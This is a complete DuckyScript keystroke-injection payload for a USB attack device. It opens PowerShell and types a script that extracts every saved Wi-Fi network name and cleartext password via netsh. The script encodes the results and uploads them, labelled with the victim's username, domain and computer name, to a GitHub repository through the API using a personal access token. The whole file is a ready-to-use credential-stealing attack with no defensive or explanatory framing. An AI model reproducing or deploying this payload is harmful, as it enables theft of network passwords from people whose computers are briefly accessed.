REM Run PowerShell
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500

STRING $wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}
ENTER
STRING $file = (New-Guid).ToString() + ".html"
ENTER
STRING $uri = "https://api.github.com/repos/{owner}/{repo}/contents/{path}" # https://docs.github.com/en/rest/repos/contents?apiVersion=2022-11-28#create-or-update-file-contents
ENTER
STRING $github_pat = "<token>" #  Read and Write access to code
ENTER
STRING $body = @{
ENTER
STRING 	message = $env:USERNAME + "@" + $env:USERDNSDOMAIN + "@" + $env:COMPUTERNAME
ENTER
STRING     content  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($wifi | ConvertTo-Html)))
ENTER
STRING }
ENTER
STRING $headers = @{
ENTER
STRING     'Accept' = 'application/vnd.github+json'
ENTER
STRING     'Authorization' = "Bearer $github_pat"
ENTER
STRING 	'X-GitHub-Api-Version' = '2022-11-28'
ENTER
STRING }
ENTER
STRING Invoke-RestMethod -Method 'Put' -Headers $headers -Uri $uri -Body ($body | ConvertTo-Json)
ENTER
